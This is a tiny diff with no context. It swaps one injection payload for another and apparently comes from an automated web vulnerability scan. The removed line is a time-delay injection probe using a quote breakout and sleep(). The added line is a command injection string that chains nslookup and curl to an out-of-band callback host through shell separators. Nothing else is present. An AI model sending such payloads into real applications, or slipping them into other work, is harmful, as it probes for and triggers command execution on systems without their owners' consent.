@@ -1,1 +1,1 @@
-555"&&sleep(27*1000)*mmberh&&"
+;(nslookup -q=cname hitatjkeucamv8d7b3.bxss.me||curl hitatjkeucamv8d7b3.bxss.me)|(nslookup -q=cname hitatjkeucamv8d7b3.bxss.me||curl hitatjkeucamv8d7b3.bxss.me)&(nslookup -q=cname hitatjkeucamv8d7b3.bxss.me||curl hitatjkeucamv8d7b3.bxss.me)
